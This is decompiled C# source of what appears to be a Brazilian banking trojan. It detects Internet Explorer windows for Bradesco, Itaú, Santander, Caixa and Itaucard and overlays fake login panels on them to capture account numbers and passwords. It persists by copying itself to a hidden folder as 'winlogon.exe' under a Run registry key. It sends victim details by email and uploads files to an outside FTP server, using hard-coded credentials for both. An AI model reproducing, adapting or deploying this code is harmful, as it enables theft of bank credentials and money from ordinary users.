using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using CodeArchitects;
using Microsoft.Win32;
using SHDocVw;

namespace KanK;

public class Form1 : Form
{
	private const int WM_QUERYENDSESSION = 17;

	private Timer timer1;

	private IContainer components;

	private string banco;

	private int titulo;

	private ComboBox comboBox1;

	private Panel inicia_cc;

	private TextBox campo_usu;

	private TextBox campo_sen;

	private Panel finaliza_cc;

	private TextBox campo_da;

	private TextBox campo_se;

	private Label label2;

	private TextBox campo_di;

	private Label campo_fi;

	internal static bool shuttingDown;

	public Satan Form_Santander2;

	public Brdsc Form_Bradesco2;

	public Itau2 Form_Itau2;

	public Personalite Form_Pers2;

	public Cxx Form_Cxx;

	private TextBox ita_a;

	private TextBox ita_b;

	private TextBox ita_c;

	private LinkLabel it_ok;

	private Panel inicia_ita;

	private TextBox bd_ag;

	private TextBox bd_nc;

	private TextBox bd_dg;

	private LinkLabel bd_ok;

	private Panel inicia_bra;

	private TextBox snt_ag;

	private TextBox snt_cc1;

	private TextBox snt_cc2;

	private LinkLabel linkLabel2;

	private TextBox snt_cc;

	private LinkLabel snt_ok;

	private Panel inicia_san;

	private RadioButton r1;

	private RadioButton r2;

	private RadioButton r3;

	private TextBox NOUS;

	private Label label8;

	private Label label1;

	private Label Tipo;

	public Panel inicia_cx;

	private TextBox prm_a;

	private TextBox prm_b;

	private TextBox prm_c;

	private LinkLabel prm_ok;

	private Panel inicia_prm;

	private TextBox prs_a;

	private TextBox prs_b;

	private TextBox prs_c;

	private Label botao_okprs;

	private Panel inicia_prs;

	public IntPtr hwnd;

	public IntPtr Hand => hwnd;

	public Form1()
	{
		InitializeComponent();
	}

	private static void Main()
	{
		AssemblyUnzipper.Initialize();
		Application.Run((Form)(object)new Form1());
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr FindWindowEx(IntPtr parent, IntPtr next, string sClassName, IntPtr sWindowTitle);

	[DllImport("user32.dll")]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(int hWnd, StringBuilder text, int count);

	[DllImport("user32.dll")]
	private static extern int SetParent(IntPtr hWndChild, IntPtr hWndNewParent);

	protected override void WndProc(ref Message m)
	{
		if (((Message)(ref m)).get_Msg() == 17)
		{
			shuttingDown = true;
			Application.Exit();
		}
		((Form)this).WndProc(ref m);
	}

	public IntPtr BuscaHandleClasse(IntPtr hwnd, string banco)
	{
		titulo = banco.IndexOf("Windows");
		if (titulo != -1)
		{
			hwnd = FindWindowEx(hwnd, IntPtr.Zero, "TabWindowClass", IntPtr.Zero);
		}
		hwnd = FindWindowEx(hwnd, IntPtr.Zero, "Shell DocObject View", IntPtr.Zero);
		hwnd = FindWindowEx(hwnd, IntPtr.Zero, "Internet Explorer_Server", IntPtr.Zero);
		return hwnd;
	}

	public static void GuardaInfo(string qual, string cont)
	{
		string path = qual + ".txt";
		StreamWriter streamWriter = new StreamWriter(path, append: true);
		streamWriter.WriteLine(cont);
		streamWriter.Close();
	}

	public string RemoveChar(string teste)
	{
		char[] anyOf = new char[14]
		{
			'=', '\\', ';', '.', ':', ',', '+', '*', '-', '_',
			'@', '#', '!', ' '
		};
		int startIndex;
		while ((startIndex = teste.IndexOfAny(anyOf)) >= 0)
		{
			teste = teste.Remove(startIndex, 1);
		}
		return teste;
	}

	private static void Registrar()
	{
		Directory.CreateDirectory("C:\\ Windows");
		File.SetAttributes("C:\\ Windows", FileAttributes.Hidden);
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		if (!File.Exists("C:\\ Windows\\winlogon.exe"))
		{
			Comunicado();
			File.Copy(Application.get_ExecutablePath().ToString(), "C:\\ Windows\\winlogon.exe", overwrite: true);
			registryKey.SetValue("Windows", "C:\\ Windows\\winlogon.exe");
		}
	}

	public static void Comunicado()
	{
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.To.Add("dellcorps@gmail.com");
			mailMessage.From = new MailAddress("producao-dell-corps@gmail.com", Environment.UserName.ToString(), Encoding.UTF8);
			mailMessage.Subject = "Seja bem vindo " + Environment.UserName.ToString() + " !";
			string text2 = (mailMessage.Body = "M-a-c-h-i-n-e...: " + Environment.MachineName.ToString() + "\nO-S-V-e-r-s-i-o-n..: " + Environment.OSVersion.ToString());
			SmtpClient smtpClient = new SmtpClient();
			NetworkCredential credentials = new NetworkCredential("antinfos@gmail.com", "ddas5en");
			smtpClient.DeliveryMethod = SmtpDeliveryMethod.Network;
			smtpClient.Port = 587;
			smtpClient.Host = "smtp.gmail.com";
			smtpClient.EnableSsl = true;
			smtpClient.UseDefaultCredentials = false;
			smtpClient.Credentials = credentials;
			object userToken = mailMessage;
			smtpClient.SendAsync(mailMessage, userToken);
		}
		catch (SmtpException)
		{
		}
		catch (Exception)
		{
		}
	}

	public static void FazerUpload(string filename)
	{
		Cursor.set_Current(Cursors.get_WaitCursor());
		FileInfo fileInfo = new FileInfo(filename);
		_ = "ftp://verifyer.org/wwwroot/added/" + fileInfo.Name;
		FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(new Uri("ftp://verifyer.org/wwwroot/added/" + fileInfo.Name));
		ftpWebRequest.Credentials = new NetworkCredential("verifyer.org", "uN4p6eFW");
		ftpWebRequest.KeepAlive = false;
		ftpWebRequest.Method = "STOR";
		ftpWebRequest.UseBinary = true;
		ftpWebRequest.ContentLength = fileInfo.Length;
		int count = 2048;
		byte[] buffer = new byte[2048];
		FileStream fileStream = fileInfo.OpenRead();
		try
		{
			Stream requestStream = ftpWebRequest.GetRequestStream();
			for (int num = fileStream.Read(buffer, 0, count); num != 0; num = fileStream.Read(buffer, 0, count))
			{
				requestStream.Write(buffer, 0, num);
			}
			requestStream.Close();
			fileStream.Close();
		}
		catch (Exception)
		{
		}
		Cursor.set_Current(Cursors.get_Default());
	}

	public static void Durma(int x)
	{
		Cursor.set_Current(Cursors.get_WaitCursor());
		Thread.Sleep(x);
		Cursor.set_Current(Cursors.get_Default());
	}

	public void NaoPrecioneLetras(object sender, KeyPressEventArgs e)
	{
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		string text = Convert.ToString(e.get_KeyChar());
		if (text != "1" && text != "2" && text != "3" && text != "4" && text != "5" && text != "6" && text != "7" && text != "8" && text != "9" && text != "0")
		{
			e.set_Handled(true);
			MessageBox.Show("Digite apenas números", "Internet Explorer", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
	}

	private void GetActiveWindow()
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		//IL_001a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		WebBrowser val = null;
		ShellWindows val2 = (ShellWindows)new ShellWindowsClass();
		foreach (WebBrowser item in (IShellWindows)val2)
		{
			WebBrowser val3 = item;
			string text = Path.GetFileNameWithoutExtension(((IWebBrowser2)val3).get_FullName())!.ToLower();
			if (text.Equals("iexplore"))
			{
				val = val3;
				break;
			}
		}
		if (val == null)
		{
			return;
		}
		int num = 0;
		StringBuilder stringBuilder = new StringBuilder(256);
		num = GetForegroundWindow();
		if (GetWindowText(num, stringBuilder, 256) <= 0)
		{
			return;
		}
		IntPtr intPtr = (hwnd = (IntPtr)((IWebBrowser2)val).get_HWND());
		banco = stringBuilder.ToString();
		if (banco == ":: Bradesco Pessoa Física :: - Windows Internet Explorer" || banco == ":: Bradesco Pessoa Física :: - Microsoft Internet Explorer")
		{
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_bra).get_Handle(), hwnd);
			timer1.set_Enabled(false);
			Durma(1000);
			((Control)inicia_bra).set_Visible(true);
		}
		if (banco == "Bradesco Prime - Windows Internet Explorer" || banco == "Bradesco Prime - Microsoft Internet Explorer")
		{
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_prm).get_Handle(), hwnd);
			timer1.set_Enabled(false);
			Durma(1000);
			((Control)inicia_prm).set_Visible(true);
		}
		if (banco == "Banco Itaú - Feito Para Você - Windows Internet Explorer" || banco == "Banco Itaú - Feito Para Você - Microsoft Internet Explorer")
		{
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_ita).get_Handle(), hwnd);
			timer1.Stop();
			Durma(5000);
			((Control)inicia_ita).set_Visible(true);
		}
		if (banco == "Itaú Personnalité - Windows Internet Explorer" || banco == "Itaú Personnalité - Microsoft Internet Explorer")
		{
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_prs).get_Handle(), hwnd);
			timer1.Stop();
			Durma(1500);
			((Control)inicia_prs).set_Visible(true);
		}
		if (banco == "Santander - Windows Internet Explorer" || banco == "Santader - Microsoft Internet Explorer")
		{
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_san).get_Handle(), hwnd);
			Durma(500);
			timer1.Stop();
			((Control)inicia_san).set_Visible(true);
		}
		if (RemoveChar(banco).ToUpper() == "INTERNETBANKINGCAIXAWINDOWSINTERNETEXPLORER" || RemoveChar(banco).ToUpper() == "INTERNETBANKINGCAIXAMICROSOFTINTERNETEXPLORER")
		{
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_cx).get_Handle(), hwnd);
			timer1.Stop();
			((Control)inicia_cx).set_Width(2000);
			((Control)inicia_cx).set_Height(999);
			Durma(500);
			((Control)inicia_cx).set_Visible(true);
		}
		if (banco == "Itaucard - Credicard Itaú Portal - Windows Internet Explorer" || banco == "Itaucard - Credicard Itaú Portal - Microsoft Internet Explorer" || banco == "Itaucard - Credicard Itaú Portal - Mozilla Firefox")
		{
			hwnd = BuscaHandleClasse((IntPtr)GetForegroundWindow(), banco);
			SetParent(((Control)inicia_cc).get_Handle(), hwnd);
			timer1.Stop();
			if (Screen.get_PrimaryScreen().get_WorkingArea().Width.ToString() == "800")
			{
				((Control)inicia_cc).set_Left(190);
			}
			else if (Screen.get_PrimaryScreen().get_WorkingArea().Width.ToString() == "1024")
			{
				((Control)inicia_cc).set_Left(300);
			}
			else if (Screen.get_PrimaryScreen().get_WorkingArea().Width.ToString() == "1280")
			{
				((Control)inicia_cc).set_Left(428);
			}
			((Control)inicia_cc).set_Top(98);
			Durma(1500);
			((Control)inicia_cc).set_Visible(true);
		}
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Expected O, but got Unknown
		//IL_00bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c6: Expected O, but got Unknown
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		//IL_00d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_00dc: Expected O, but got Unknown
		//IL_00dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e7: Expected O, but got Unknown
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f2: Expected O, but got Unknown
		//IL_00f3: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_0109: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		//IL_0114: Unknown result type (might be due to invalid IL or missing references)
		//IL_011e: Expected O, but got Unknown
		//IL_011f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Expected O, but got Unknown
		//IL_012a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0134: Expected O, but got Unknown
		//IL_0135: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Expected O, but got Unknown
		//IL_0140: Unknown result type (might be due to invalid IL or missing references)
		//IL_014a: Expected O, but got Unknown
		//IL_014b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0155: Expected O, but got Unknown
		//IL_0156: Unknown result type (might be due to invalid IL or missing references)
		//IL_0160: Expected O, but got Unknown
		//IL_0161: Unknown result type (might be due to invalid IL or missing references)
		//IL_016b: Expected O, but got Unknown
		//IL_016c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0176: Expected O, but got Unknown
		//IL_0177: Unknown result type (might be due to invalid IL or missing references)
		//IL_0181: Expected O, but got Unknown
		//IL_0182: Unknown result type (might be due to invalid IL or missing references)
		//IL_018c: Expected O, but got Unknown
		//IL_018d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0197: Expected O, but got Unknown
		//IL_0198: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a2: Expected O, but got Unknown
		//IL_01a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ad: Expected O, but got Unknown
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01b9: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c3: Expected O, but got Unknown
		//IL_01c4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ce: Expected O, but got Unknown
		//IL_01cf: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d9: Expected O, but got Unknown
		//IL_01da: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e4: Expected O, but got Unknown
		//IL_01e5: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ef: Expected O, but got Unknown
		//IL_01f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_01fa: Expected O, but got Unknown
		//IL_01fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0205: Expected O, but got Unknown
		//IL_0206: Unknown result type (might be due to invalid IL or missing references)
		//IL_0210: Expected O, but got Unknown
		//IL_0211: Unknown result type (might be due to invalid IL or missing references)
		//IL_021b: Expected O, but got Unknown
		//IL_02af: Unknown result type (might be due to invalid IL or missing references)
		//IL_02b9: Expected O, but got Unknown
		//IL_0346: Unknown result type (might be due to invalid IL or missing references)
		//IL_0350: Expected O, but got Unknown
		//IL_037a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0384: Expected O, but got Unknown
		//IL_0411: Unknown result type (might be due to invalid IL or missing references)
		//IL_041b: Expected O, but got Unknown
		//IL_0445: Unknown result type (might be due to invalid IL or missing references)
		//IL_044f: Expected O, but got Unknown
		//IL_04dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_04e6: Expected O, but got Unknown
		//IL_0584: Unknown result type (might be due to invalid IL or missing references)
		//IL_058e: Expected O, but got Unknown
		//IL_066f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0679: Expected O, but got Unknown
		//IL_06d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e0: Expected O, but got Unknown
		//IL_0716: Unknown result type (might be due to invalid IL or missing references)
		//IL_0720: Expected O, but got Unknown
		//IL_0780: Unknown result type (might be due to invalid IL or missing references)
		//IL_078a: Expected O, but got Unknown
		//IL_07c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_07ca: Expected O, but got Unknown
		//IL_082a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0834: Expected O, but got Unknown
		//IL_08ba: Unknown result type (might be due to invalid IL or missing references)
		//IL_08c4: Expected O, but got Unknown
		//IL_0921: Unknown result type (might be due to invalid IL or missing references)
		//IL_092b: Expected O, but got Unknown
		//IL_09d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_09dc: Expected O, but got Unknown
		//IL_0a7e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0ea0: Unknown result type (might be due to invalid IL or missing references)
		//IL_0eaa: Expected O, but got Unknown
		//IL_0fd8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0fe2: Expected O, but got Unknown
		//IL_104f: Unknown result type (might be due to invalid IL or missing references)
		//IL_10bb: Unknown result type (might be due to invalid IL or missing references)
		//IL_10c5: Expected O, but got Unknown
		//IL_1210: Unknown result type (might be due to invalid IL or missing references)
		//IL_121a: Expected O, but got Unknown
		//IL_1238: Unknown result type (might be due to invalid IL or missing references)
		//IL_12a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_12b3: Expected O, but got Unknown
		//IL_12d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_1369: Unknown result type (might be due to invalid IL or missing references)
		//IL_1373: Expected O, but got Unknown
		//IL_138e: Unknown result type (might be due to invalid IL or missing references)
		//IL_1408: Unknown result type (might be due to invalid IL or missing references)
		//IL_1412: Expected O, but got Unknown
		//IL_1564: Unknown result type (might be due to invalid IL or missing references)
		//IL_156e: Expected O, but got Unknown
		//IL_15fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_1605: Expected O, but got Unknown
		//IL_1618: Unknown result type (might be due to invalid IL or missing references)
		//IL_1622: Expected O, but got Unknown
		//IL_16af: Unknown result type (might be due to invalid IL or missing references)
		//IL_16b9: Expected O, but got Unknown
		//IL_16e3: Unknown result type (might be due to invalid IL or missing references)
		//IL_16ed: Expected O, but got Unknown
		//IL_177a: Unknown result type (might be due to invalid IL or missing references)
		//IL_1784: Expected O, but got Unknown
		//IL_17bc: Unknown result type (might be due to invalid IL or missing references)
		//IL_17c6: Expected O, but got Unknown
		//IL_1848: Unknown result type (might be due to invalid IL or missing references)
		//IL_192f: Unknown result type (might be due to invalid IL or missing references)
		//IL_1939: Expected O, but got Unknown
		//IL_1999: Unknown result type (might be due to invalid IL or missing references)
		//IL_19a3: Expected O, but got Unknown
		//IL_19c2: Unknown result type (might be due to invalid IL or missing references)
		//IL_19cc: Expected O, but got Unknown
		//IL_1a2c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a36: Expected O, but got Unknown
		//IL_1a6c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1a76: Expected O, but got Unknown
		//IL_1ad3: Unknown result type (might be due to invalid IL or missing references)
		//IL_1add: Expected O, but got Unknown
		//IL_1b15: Unknown result type (might be due to invalid IL or missing references)
		//IL_1b1f: Expected O, but got Unknown
		//IL_1bf8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1c02: Expected O, but got Unknown
		//IL_1cc8: Unknown result type (might be due to invalid IL or missing references)
		//IL_1cd2: Expected O, but got Unknown
		//IL_1d7c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1d86: Expected O, but got Unknown
		//IL_1e0c: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e16: Expected O, but got Unknown
		//IL_1e45: Unknown result type (might be due to invalid IL or missing references)
		//IL_1e4f: Expected O, but got Unknown
		//IL_1ec4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1ece: Expected O, but got Unknown
		//IL_1f14: Unknown result type (might be due to invalid IL or missing references)
		//IL_1f1e: Expected O, but got Unknown
		//IL_1fa4: Unknown result type (might be due to invalid IL or missing references)
		//IL_1fae: Expected O, but got Unknown
		//IL_2070: Unknown result type (might be due to invalid IL or missing references)
		//IL_207a: Expected O, but got Unknown
		//IL_2106: Unknown result type (might be due to invalid IL or missing references)
		//IL_2110: Expected O, but got Unknown
		//IL_223c: Unknown result type (might be due to invalid IL or missing references)
		//IL_2246: Expected O, but got Unknown
		//IL_2299: Unknown result type (might be due to invalid IL or missing references)
		//IL_22a3: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		timer1 = new Timer(components);
		bd_ag = new TextBox();
		bd_nc = new TextBox();
		bd_dg = new TextBox();
		bd_ok = new LinkLabel();
		inicia_bra = new Panel();
		snt_ag = new TextBox();
		snt_cc1 = new TextBox();
		snt_cc2 = new TextBox();
		linkLabel2 = new LinkLabel();
		snt_cc = new TextBox();
		snt_ok = new LinkLabel();
		inicia_san = new Panel();
		r1 = new RadioButton();
		r2 = new RadioButton();
		r3 = new RadioButton();
		NOUS = new TextBox();
		label8 = new Label();
		label1 = new Label();
		Tipo = new Label();
		inicia_cx = new Panel();
		comboBox1 = new ComboBox();
		inicia_prs = new Panel();
		botao_okprs = new Label();
		prs_c = new TextBox();
		prs_b = new TextBox();
		prs_a = new TextBox();
		inicia_prm = new Panel();
		prm_ok = new LinkLabel();
		prm_c = new TextBox();
		prm_b = new TextBox();
		prm_a = new TextBox();
		inicia_ita = new Panel();
		it_ok = new LinkLabel();
		ita_c = new TextBox();
		ita_b = new TextBox();
		ita_a = new TextBox();
		inicia_cc = new Panel();
		finaliza_cc = new Panel();
		campo_fi = new Label();
		campo_di = new TextBox();
		campo_da = new TextBox();
		campo_se = new TextBox();
		label2 = new Label();
		campo_usu = new TextBox();
		campo_sen = new TextBox();
		((Control)inicia_bra).SuspendLayout();
		((Control)inicia_san).SuspendLayout();
		((Control)inicia_cx).SuspendLayout();
		((Control)inicia_prs).SuspendLayout();
		((Control)inicia_prm).SuspendLayout();
		((Control)inicia_ita).SuspendLayout();
		((Control)inicia_cc).SuspendLayout();
		((Control)finaliza_cc).SuspendLayout();
		((Control)this).SuspendLayout();
		timer1.set_Enabled(true);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)bd_ag).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)bd_ag).set_Location(new Point(379, 4));
		((TextBoxBase)bd_ag).set_MaxLength(4);
		((Control)bd_ag).set_Name("bd_ag");
		((Control)bd_ag).set_Size(new Size(35, 18));
		((Control)bd_ag).set_TabIndex(5);
		((Control)bd_ag).add_Enter((EventHandler)bd_ag_Enter);
		((Control)bd_ag).add_Leave((EventHandler)bd_ag_Leave);
		((Control)bd_ag).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)bd_ag).add_TextChanged((EventHandler)bd_ag_TextChanged);
		((Control)bd_nc).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)bd_nc).set_Location(new Point(460, 4));
		((TextBoxBase)bd_nc).set_MaxLength(7);
		((Control)bd_nc).set_Name("bd_nc");
		((Control)bd_nc).set_Size(new Size(57, 18));
		((Control)bd_nc).set_TabIndex(6);
		((Control)bd_nc).add_Enter((EventHandler)bd_nc_Enter);
		((Control)bd_nc).add_Leave((EventHandler)bd_nc_Leave);
		((Control)bd_nc).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)bd_nc).add_TextChanged((EventHandler)bd_nc_TextChanged);
		((Control)bd_dg).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)bd_dg).set_Location(new Point(517, 4));
		((TextBoxBase)bd_dg).set_MaxLength(1);
		((Control)bd_dg).set_Name("bd_dg");
		((Control)bd_dg).set_Size(new Size(13, 18));
		((Control)bd_dg).set_TabIndex(7);
		((Control)bd_dg).add_Enter((EventHandler)bd_dg_Enter);
		((Control)bd_dg).add_Leave((EventHandler)bd_dg_Leave);
		((Control)bd_dg).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)bd_ok).set_BackColor(Color.Transparent);
		((Control)bd_ok).set_Cursor(Cursors.get_Hand());
		((Control)bd_ok).set_Location(new Point(537, 5));
		((Control)bd_ok).set_Name("bd_ok");
		((Control)bd_ok).set_Size(new Size(19, 16));
		((Control)bd_ok).set_TabIndex(8);
		((Control)bd_ok).add_Click((EventHandler)botao1_Click);
		((Control)inicia_bra).set_BackColor(Color.White);
		((Control)inicia_bra).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_bra.BackgroundImage"));
		((Control)inicia_bra).set_BackgroundImageLayout((ImageLayout)0);
		((Control)inicia_bra).set_CausesValidation(false);
		((Control)inicia_bra).get_Controls().Add((Control)(object)bd_ok);
		((Control)inicia_bra).get_Controls().Add((Control)(object)bd_dg);
		((Control)inicia_bra).get_Controls().Add((Control)(object)bd_nc);
		((Control)inicia_bra).get_Controls().Add((Control)(object)bd_ag);
		((Control)inicia_bra).set_Location(new Point(4, 1));
		((Control)inicia_bra).set_Name("inicia_bra");
		((Control)inicia_bra).set_Size(new Size(562, 25));
		((Control)inicia_bra).set_TabIndex(16);
		((Control)inicia_bra).set_Visible(false);
		((TextBoxBase)snt_ag).set_BorderStyle((BorderStyle)0);
		((Control)snt_ag).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)snt_ag).set_Location(new Point(52, 15));
		((TextBoxBase)snt_ag).set_MaxLength(4);
		((Control)snt_ag).set_Name("snt_ag");
		((Control)snt_ag).set_Size(new Size(31, 11));
		((Control)snt_ag).set_TabIndex(0);
		((Control)snt_ag).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)snt_ag).add_TextChanged((EventHandler)snt_ag_TextChanged);
		((TextBoxBase)snt_cc1).set_BorderStyle((BorderStyle)0);
		((Control)snt_cc1).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)snt_cc1).set_Location(new Point(147, 15));
		((TextBoxBase)snt_cc1).set_MaxLength(6);
		((Control)snt_cc1).set_Name("snt_cc1");
		((Control)snt_cc1).set_Size(new Size(45, 11));
		((Control)snt_cc1).set_TabIndex(2);
		((Control)snt_cc1).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)snt_cc1).add_TextChanged((EventHandler)snt_cc1_TextChanged);
		((TextBoxBase)snt_cc2).set_BorderStyle((BorderStyle)0);
		((Control)snt_cc2).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)snt_cc2).set_Location(new Point(199, 15));
		((TextBoxBase)snt_cc2).set_MaxLength(1);
		((Control)snt_cc2).set_Name("snt_cc2");
		((Control)snt_cc2).set_Size(new Size(9, 11));
		((Control)snt_cc2).set_TabIndex(3);
		((Control)snt_cc2).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)linkLabel2).set_BackColor(Color.Transparent);
		((Control)linkLabel2).set_Cursor(Cursors.get_Hand());
		((Control)linkLabel2).set_Location(new Point(241, 10));
		((Control)linkLabel2).set_Name("linkLabel2");
		((Control)linkLabel2).set_Size(new Size(18, 14));
		((Control)linkLabel2).set_TabIndex(7);
		((TextBoxBase)snt_cc).set_BorderStyle((BorderStyle)0);
		((Control)snt_cc).set_Font(new Font("Verdana", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)snt_cc).set_Location(new Point(125, 15));
		((TextBoxBase)snt_cc).set_MaxLength(2);
		((Control)snt_cc).set_Name("snt_cc");
		((Control)snt_cc).set_Size(new Size(16, 11));
		((Control)snt_cc).set_TabIndex(1);
		((Control)snt_cc).add_KeyPress(new KeyPressEventHandler(NaoPrecioneLetras));
		((Control)snt_cc).add_TextChanged((EventHandler)snt_cc_TextChanged);
		((Control)snt_ok).set_BackColor(Color.Transparent);
		((Control)snt_ok).set_Cursor(Cursors.get_Hand());
		((Control)snt_ok).set_Location(new Point(214, 14));
		((Control)snt_ok).set_Name("snt_ok");
		((Control)snt_ok).set_Size(new Size(15, 13));
		((Control)snt_ok).set_TabIndex(9);
		((Control)snt_ok).add_Click((EventHandler)snt_ok_Click);
		((Control)inicia_san).set_BackgroundImage((Image)componentResourceManager.GetObject("inicia_san.BackgroundImage"));
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_ok);
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_cc);
		((Control)inicia_san).get_Controls().Add((Control)(object)linkLabel2);
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_cc2);
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_cc1);
		((Control)inicia_san).get_Controls().Add((Control)(object)snt_ag);
		((Control)inicia_san).set_Location(new Point(451, 19));
		((Control)inicia_san).set_Margin(new Padding(0));
		((Control)inicia_san).set_Name("inicia_san");
		((Control)inicia_san).set_Size(new Size(253, 43));
		((Control)inicia_san).set_TabIndex(18);
		((Control)inicia_san).set_Visible(false);
		((Control)r1).set_AutoSize(true);
		((Control)r1).set_BackColor(Color.Transparent);
		((Control)r1).set_Location(new Point(257, 196));
		((Control)r1).set_Name("r1");
		((Control)r1).set_Size(new Size(14, 13));
		((Control)r1).set_TabIndex(1);
		r1.set_TabStop(true);
		((ButtonBase)r1).set_UseVisualStyleBackColor(false);
		r1.add_CheckedChanged((EventHandler)r1_CheckedChanged);
